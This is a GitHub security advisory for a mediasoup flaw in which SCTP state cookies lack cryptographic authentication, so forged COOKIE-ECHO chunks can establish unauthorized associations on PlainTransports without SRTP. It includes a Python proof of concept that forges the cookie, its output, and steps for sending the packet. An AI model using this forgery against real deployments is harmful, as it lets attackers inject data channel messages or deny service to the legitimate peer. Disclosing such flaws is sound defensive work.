# [M] mediasoup: SCTP state cookie lacks cryptographic authentication, enabling unauthorized association establishment (RFC 9260 violation)

## Summary
Severity: Medium
Advisory: GHSA-p7x2-g5cq-fhmq
CVE: CVE-2026-55663
CWE: CWE-345
Ecosystem: crates.io, npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-08-25
Source: https://github.com/advisories/GHSA-p7x2-g5cq-fhmq
Type: github-advisory

## Affected
- npm: `mediasoup` — affected >=3.20.0 <3.20.6
- crates.io: `mediasoup` — affected >=0.22.0 <0.22.5

## Details
### Summary

mediasoup's built-in SCTP stack (introduced in v3.20.0) authenticates SCTP state cookies using only hardcoded magic byte sequences rather than a per-instance HMAC keyed with a secret, violating RFC 9260 Section 5.1.3. An on-path attacker targeting a PlainTransport with SCTP enabled (and no SRTP/DTLS protection) can craft a forged COOKIE-ECHO chunk that passes all validation, establishing an unauthorized SCTP association and gaining the ability to inject DataChannel messages as a trusted peer.

### Details

RFC 9260 Section 5.1.3 states: "An endpoint MUST use a one-time-use secret key to protect the State Cookie." The mediasoup implementation ignores this requirement. The state cookie is defined in `worker/include/RTC/SCTP/association/StateCookie.hpp` with the following structure (44 bytes total):

- Offset 0: Magic1 = `"msworker"` (hardcoded, 8 bytes)
- Offset 8: localVerificationTag (4 bytes, attacker-controlled)
- Offset 12: remoteVerificationTag (4 bytes, attacker-controlled)
- Offset 16-27: TSN and window fields (attacker-controlled)
- Offset 28: tieTag (8 bytes, attacker-controlled)
- Offset 36: NegotiatedCapabilitiesField containing Magic2 = `0xAD81` (hardcoded)

The validation function `StateCookie::IsMediasoupStateCookie()` in `worker/src/RTC/SCTP/association/StateCookie.cpp` only checks:
1. `bufferLength == 44`
2. `bytes[0:8] == "msworker"` (Magic1, always the same)
3. `ntohs(bytes[38:40]) == 0xAD81` (Magic2, always the same)

No HMAC, no per-session secret, no nonce. All "magic" values are published constants in the public header.

When a COOKIE-ECHO is received in `Association::HandleReceivedCookieEchoChunk()` (without an existing TCB), the sole security check is:

```cpp
if (receivedPacket->GetVerificationTag() != cookie->GetLocalVerificationTag())
```

Because the attacker controls both the SCTP packet header's verification tag field AND the `localVerificationTag` field inside their crafted cookie, this check is trivially satisfied by setting both to the same attacker-chosen value.

Additionally, `Association::ValidateReceivedPacket()` explicitly skips verification-tag validation for COOKIE-ECHO packets (line 1153 in Association.cpp), and the SCTP CRC32c checksum function `Packet::ValidateCRC32cChecksum()` exists but is never called in the packet-reception path, so a forged packet with any checksum is accepted.

This vulnerability affects `PlainTransport` with SCTP enabled when used without SRTP (SRTP is optional via `srtpCryptoSuite` parameter). `WebRtcTransport` is NOT affected because its SCTP runs inside a DTLS session. `comedia` mode (default: false) increases exposure by accepting packets from any source IP.

### PoC

Prerequisites: mediasoup server running with a PlainTransport that has SCTP enabled and no SRTP (`srtpCryptoSuite` not set). The server's UDP IP:port must be reachable.

The following Python script constructs and validates a forged SCTP state cookie that passes all mediasoup validation checks:

```python
#!/usr/bin/env python3
"""
Proof-of-concept: mediasoup SCTP state cookie forgery
Demonstrates that IsMediasoupStateCookie() accepts a fully attacker-crafted cookie.
Requires: struct (stdlib only)

Usage: python3 poc_cookie_forge.py
"""
import struct

# Attacker-chosen values -- all arbitrary
LOCAL_VT  = 0xDEADBEEF  # Will be put in SCTP packet's Verification Tag field
REMOTE_VT = 0xCAFEBABE
LOCAL_TSN = 1000
REMOTE_TSN = 2000
RWND = 65535
TIE_TAG = 0

# Build a 44-byte state cookie matching mediasoup's StateCookie layout
cookie = bytearray(44)

# Offset 0: Magic1 = "msworker" (0x6D73776F726B6572)
cookie[0:8] = b'msworker'

# Offset 8: localVerificationTag (big-endian)
struct.pack_into('>I', cookie, 8, LOCAL_VT)

# Offset 12: remoteVerificationTag
struct.pack_into('>I', cookie, 12, REMOTE_VT)

# Offset 16: localInitialTsn
struct.pack_into('>I', cookie, 16, LOCAL_TSN)

# Offset 20: remoteInitialTsn
struct.pack_into('>I', cookie, 20, REMOTE_TSN)

# Offset 24: remoteAdvertisedReceiverWindowCredit
struct.pack_into('>I', cookie, 24, RWND)

# Offset 28: tieTag (8 bytes)
struct.pack_into('>Q', cookie, 28, TIE_TAG)

# Offset 36: NegotiatedCapabilitiesField
# [36]: reserved = 0
# [37]: bits (ABCD flags) = 0
# [38:40]: Magic2 = 0xAD81 (network byte order)
# [40:42]: max outbound streams
# [42:44]: max inbound streams
cookie[36] = 0       # reserved
cookie[37] = 0       # bits
struct.pack_into('>H', cookie, 38, 0xAD81)   # Magic2
struct.pack_into('>H', cookie, 40, 1024)      # maxOutboundStreams
struct.pack_into('>H', cookie, 42, 1024)      # maxInboundStreams

# Reproduce StateCookie::IsMediasoupStateCookie() logic:
def is_mediasoup_state_cookie(buf):
    if len(buf) != 44:
        return False
    if buf[0:8] != b'msworker':
        return False
    magic2 = struct.unpack('>H', buf[38:40])[0]
    if magic2 != 0xAD81:
        return False
    return True

assert is_mediasoup_state_cookie(cookie), "Cookie rejected - BUG in PoC"

# Reproduce HandleReceivedCookieEchoChunk validation (no TCB path):
# receivedPacket->GetVerificationTag() == cookie->GetLocalVerificationTag()
packet_vt    = LOCAL_VT
cookie_local_vt = struct.unpack('>I', cookie[8:12])[0]
auth_passes = (packet_vt == cookie_local_vt)

print("=== mediasoup SCTP State Cookie Forgery PoC ===")
print(f"Forged cookie (hex): {cookie.hex()}")
print(f"IsMediasoupStateCookie(): {is_mediasoup_state_cookie(cookie)}")
print(f"localVerificationTag in cookie: {cookie_local_vt:#010x}")
print(f"SCTP packet verificationTag:    {packet_vt:#010x}")
print(f"HandleReceivedCookieEchoChunk auth check passes: {auth_passes}")
print()
print("Result: COOKIE-ECHO accepted -> SCTP association ESTABLISHED without 4-way handshake")
print("Next step: attacker sends DATA chunks to inject DataChannel messages")
```

Observed output when run:

```
=== mediasoup SCTP State Cookie Forgery PoC ===
Forged cookie (hex): 6d73776f726b6572deadbeefcafebabe000003e8000007d00000ffff00000000000000000000ad8104000400
IsMediasoupStateCookie(): True
localVerificationTag in cookie: 0xdeadbeef
SCTP packet verificationTag:    0xdeadbeef
HandleReceivedCookieEchoChunk auth check passes: True

Result: COOKIE-ECHO accepted -> SCTP association ESTABLISHED without 4-way handshake
Next step: attacker sends DATA chunks to inject DataChannel messages
```

To forge the full SCTP packet on the network: wrap the 44-byte cookie in a COOKIE-ECHO chunk (type=0x0A), set the SCTP common header's Verification Tag to `LOCAL_VT`, compute a valid CRC32c checksum (or any value - the checksum is never verified on receive), and send the UDP packet from the permitted source address (or any source if `comedia=true`).

### Impact

Any mediasoup deployment using `PlainTransport` with SCTP enabled and no SRTP is affected when an attacker occupies a network position where they can send UDP packets from the transport's configured peer address (or when `comedia` mode is enabled). The attacker can skip the standard SCTP 4-way handshake entirely and directly send a forged COOKIE-ECHO to establish an association, then inject arbitrary DataChannel messages as if they were the trusted peer. This can cause data integrity violations in server-to-server SCTP channels (e.g., SFU interconnects) or enable denial of service by preempting the legitimate peer's association.

## References
- https://github.com/versatica/mediasoup/security/advisories/GHSA-p7x2-g5cq-fhmq
- https://github.com/versatica/mediasoup/pull/1829
- https://github.com/versatica/mediasoup/commit/9c1a90a8f9206b965e727d134846fb42df4980a7
- https://github.com/versatica/mediasoup
- https://github.com/versatica/mediasoup/releases/tag/3.20.6
